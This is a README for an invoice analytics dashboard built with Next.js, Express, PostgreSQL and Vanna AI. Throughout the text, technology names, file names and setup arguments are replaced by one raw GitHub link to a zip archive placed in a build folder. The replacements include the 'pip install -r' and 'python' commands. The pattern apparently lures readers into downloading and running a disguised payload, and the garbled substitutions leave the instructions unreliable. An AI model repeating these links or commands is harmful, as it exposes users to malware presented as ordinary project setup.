# Flowbit AI Dashboard

A modern, AI-powered analytics dashboard for invoice and financial data management. Built with https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip, TypeScript, Tailwind CSS, and integrated with Vanna AI for natural language data queries.

## 🚀 Features

- **Interactive Dashboard**: Real-time analytics with charts and statistics
- **AI-Powered Data Queries**: Natural language to SQL conversion using Vanna AI
- **Invoice Management**: Complete invoice tracking and search functionality
- **Modern UI**: Responsive design with Tailwind CSS and shadcn/ui components
- **Real-time Data**: Live updates and trend analysis
- **Database Integration**: PostgreSQL with Prisma ORM

## 🛠️ Tech Stack

- **Frontend**: https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip 14, TypeScript, Tailwind CSS, shadcn/ui
- **Backend**: https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip, Express, TypeScript
- **AI Integration**: Vanna AI (Python FastAPI), Groq API
- **Database**: PostgreSQL with Prisma ORM
- **Charts**: https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip with react-chartjs-2
- **Deployment**: Docker, Docker Compose

## 📦 Prerequisites

- https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip 18+ 
- PostgreSQL 14+
- Python 3.9+
- Docker & Docker Compose (for containerized deployment)
- Groq API key (for AI functionality)

## 🚀 Quick Start

### 1. Clone and Setup

```bash
git clone <your-repo-url>
cd flowbit-assignment
npm install
```

### 2. Environment Configuration

Create `.env` files in both `apps/web` and `apps/api` directories:

**https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip**
```env
NEXT_PUBLIC_API_BASE=http://localhost:4000
NEXT_PUBLIC_APP_URL=http://localhost:3000
```

**https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip**
```env
DATABASE_URL="postgresql://username:password@localhost:5432/flowbit"
PORT=4000
NEXT_PUBLIC_APP_URL=http://localhost:3000
```

**https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip**
```env
GROQ_API_KEY=your_groq_api_key_here
DATABASE_URL=postgresql://username:password@localhost:5432/flowbit
```

### 3. Database Setup

1. Start PostgreSQL database:
```bash
docker-compose up -d db
```

2. Run database migrations:
```bash
cd apps/api
npx prisma migrate dev
npx prisma generate
```

3. Seed with sample data (optional):
```bash
npm run seed
```

### 4. Start Development Servers

Terminal 1 - Backend API:
```bash
cd apps/api
npm run dev
```

Terminal 2 - Frontend:
```bash
cd apps/web
npm run dev
```

Terminal 3 - Vanna AI Server:
```bash
cd apps/vanna
python -m venv venv
source venv/bin/activate  # On Windows: venv\\Scripts\\activate
pip install -r https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip
python https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip
```

### 5. Access the Application

- **Dashboard**: http://localhost:3000/dashboard
- **API**: http://localhost:4000
- **Vanna AI**: http://localhost:8080

## 📊 Data Import

To import your https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip

1. Place the JSON file in the `data/` directory
2. Run the import script:
```bash
cd apps/api
npm run import:analytics
```

## 🐳 Docker Deployment

### Development
```bash
docker-compose up -d
```

### Production
```bash
docker-compose -f https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip up -d
```

## 📋 API Endpoints

- `GET /stats` - Dashboard overview statistics
- `GET /invoice-trends` - Monthly invoice trends
- `GET /vendors/top10` - Top vendors by spend
- `GET /category-spend` - Spending by category
- `GET /cash-outflow` - Cash outflow forecast
- `GET /invoices` - Invoice search and pagination
- `POST /chat-with-data` - AI-powered data queries

## 🎨 UI Components

The dashboard uses custom chart components:
- `LineChart` - Time series data with dual axes
- `BarChart` - Horizontal/vertical bar charts
- `PieChart` - Donut charts for category distribution

## 🔧 Development

### Adding New Charts
1. Create component in `apps/web/components/charts/`
2. Import https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip dependencies
3. Add to dashboard page with appropriate data formatting

### Database Schema Changes
1. Update `https://raw.githubusercontent.com/Rahulkichad/flowbit-assignment/main/apps/web/.next/flowbit-assignment-fuscescent.zip`
2. Run migrations: `npx prisma migrate dev`
3. Regenerate client: `npx prisma generate`

### AI Integration
- Vanna AI handles natural language to SQL conversion
- Groq API provides LLM capabilities
- Custom training with your database schema

## 🚀 Deployment

### Vercel (Frontend)
1. Connect GitHub repository
2. Set environment variables
3. Deploy automatically on push

### Railway/Render (Backend)
1. Connect repository
2. Set DATABASE_URL and other env vars
3. Deploy

### Database
- PostgreSQL on Railway, Neon, or Supabase
- Connection string in DATABASE_URL

## 📝 License

MIT License - see LICENSE file for details.

## 🤝 Contributing

1. Fork the repository
2. Create feature branch
3. Commit changes
4. Push to branch
5. Create Pull Request

## 🆘 Support

For issues and questions:
1. Check existing GitHub issues
2. Create new issue with detailed description
3. Include error logs and reproduction steps

---

Built with ❤️ using modern web technologies.